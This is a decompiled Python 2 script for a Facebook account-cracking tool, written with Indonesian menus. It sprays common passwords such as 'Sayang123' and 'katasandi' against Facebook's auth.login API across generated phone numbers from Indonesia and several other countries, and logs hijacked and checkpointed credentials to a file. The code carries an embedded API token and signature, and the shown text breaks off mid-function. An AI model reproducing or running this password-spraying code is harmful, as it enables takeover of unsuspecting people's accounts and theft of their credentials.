# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: Sumarr ID
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, requests, mechanize
try:
    import requests
except ImportError:
    os.system('pip2 install tqdm')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 contoh.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def keluar():
    print 'Keluar'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


from tqdm import tqdm

def load():
    with tqdm(total=100, desc='Loading ', bar_format='{l_bar}{bar}') as (pbar):
        for i in range(100):
            time.sleep(0.03)
            pbar.update(1)


logo = '\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;91m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 Y\x1b[1;91m C \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x96\x82\xe2\x95\xb1\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 A\x1b[1;91m R \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x96\x82\xe2\x95\xb1\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 Y\x1b[1;91m 4 \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x82\xe2\x95\xb1\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 A\x1b[1;91m C \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x82\xe2\x95\xb1\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x96\x87\xe2\x96\x87 N\x1b[1;91m K \xe2\x96\x87\xe2\x96\x87\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87  \x1b[1;91m   \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;91m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;91mSudahkah anda mempunyai\n\x1b[1;92mUsername sama password\n\x1b[1;93mUntuk login tools?\n\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n'
logo2 = '\n\x1b[1;94m \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97    \n\x1b[1;94m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d    \n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d     \n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \n\x1b[1;93m\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97    \n\x1b[1;93m \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d    \n\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;93m{\xf0\x9f\x92\x89\x1b[1;93m} \x1b[1;92mAuthor    \x1b[1;91m: \x1b[1;96mYayanXD\n\x1b[1;93m{\xf0\x9f\x92\x89\x1b[1;93m} \x1b[1;92mGithub    \x1b[1;91m: \x1b[1;96mgithub.com/Yayan-XD\n\x1b[1;93m{\xf0\x9f\x92\x89\x1b[1;93m} \x1b[1;92mInstagram \x1b[1;91m: \x1b[1;96m@yayanxd_\n\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n'
back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []
os.system('clear')
CorrectUsername = 'Hilman'
CorrectPassword = 'Ganteng'
loop = 'true'
while loop == 'true':
    print logo
    username = raw_input('\x1b[1;93m\xf0\x9f\x93\x8b \x1b[1;95mTools Username \x1b[1;91m\xc2\xbb\xc2\xbb \x1b[1;96m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;93m\xf0\x9f\x97\x9d \x1b[1;95mTools Password \x1b[1;91m\xc2\xbb\xc2\xbb \x1b[1;96m')
        if password == CorrectPassword:
            print 'Orang Yang Paling Ganteng Adalah ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;96msalah kentod'
            os.system('xdg-open https://wa.me/6289504395170?text=bang+username+dan+password+nya+apaan+nanti+saya+kasih+pulsa+5000+deh+janji')
    else:
        print '\x1b[1;96msalah jembut'
        os.system('xdg-open https://wa.me/6285603036683?text=bang+username+dan+password+nya+apaan+nanti+saya+kasih+pulsa+5000+janji')

def menu():
    os.system('clear')
    print logo2
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m[\x1b[1;36m01\x1b[1;97m]\x1b[1;36m Crack Semua ID \x1b[1;94m[\x1b[1;91mLogin FB\x1b[1;94m]'
    print '\x1b[1;97m[\x1b[1;36m02\x1b[1;97m]\x1b[1;96m Crack Dari Nomer Handphone \x1b[1;97m[\x1b[1;93mNo Login\x1b[1;97m]'
    print '\x1b[1;97m[\x1b[1;36m03\x1b[1;97m]\x1b[1;96m Crack Dari Email \x1b[1;31mYahoo,Gmail,Hotmail \x1b[1;97m[\x1b[1;93mNo Login\x1b[1;97m]'
    print '\x1b[1;97m[\x1b[1;36m04\x1b[1;97m]\x1b[1;36m Update Tools'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Keluar'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_menu()


def pilih_menu():
    unikers = raw_input('\x1b[1;93m\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x96\xba \x1b[92m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m lihat menu nya dong anjing'
        pilih_menu()
    elif unikers == '1' or unikers == '01':
        os.system('python Contoh1.py')
    elif unikers == '2' or unikers == '02':
        crack_nomor()
    elif unikers == '3' or unikers == '03':
        os.system('python Mail.py')
    elif unikers == '4' or unikers == '04':
        os.system('git pull')
    elif unikers == '0' or unikers == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m\xc3\xb7\x1b[1;97m] \x1b[1;91mlihat menu nya dong anjing'
        pilih_menu()


def crack_nomor():
    os.system('clear')
    print logo2
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m]\x1b[1;97m Crack Akun Indonesia'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m]\x1b[1;97m Crack Akun Bangladesh'
    print '\x1b[1;97m[\x1b[1;92m03\x1b[1;97m]\x1b[1;97m Crack Akun Pakistan'
    print '\x1b[1;97m[\x1b[1;92m04\x1b[1;97m]\x1b[1;97m Crack Akun India'
    print '\x1b[1;97m[\x1b[1;92m05\x1b[1;97m]\x1b[1;97m Crack Akun Vietnam'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;92m Kembali ke menu          '
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;93m\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x96\xba \x1b[1;92m')
    if unikers == '':
        print '\x1b[1;97m[\x1b[1;91mx\x1b[1;97m]\x1b[1;91m lihat menu nya dong anjing'
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '2' or unikers == '02':
        bangla()
    elif unikers == '3' or unikers == '03':
        pakistan()
    elif unikers == '4' or unikers == '04':
        india()
    elif unikers == '5' or unikers == '05':
        nguyen()
    elif unikers == '0' or unikers == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m\xc3\xb7\x1b[1;97m lihat menu nya dong anjing'
        pilih()


def indo():
    global cekpoint
    global oks
    os.system('clear')
    print logo2
    print '\x1b[1;92m    951-331-953-954-955-956-520-521-522-523'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Pilih Nomor \x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;96m Masukan 3 Digit Angka') if len(c) < 3 else ''
        k = '+628'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Back ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(1)
    jalan('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mJangan Keluar!')
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Sedang Berlangsung' + o,
        sys.stdout.flush()
        time.sleep(1)

    print 50 * '\x1b[1;34m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            pass1 = 'katasandi'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/ind.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/ind.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = 'Sayang123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/ind.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/ind.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Bangsat'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/ind.txt', 'a')
                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/ind.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Anjing'
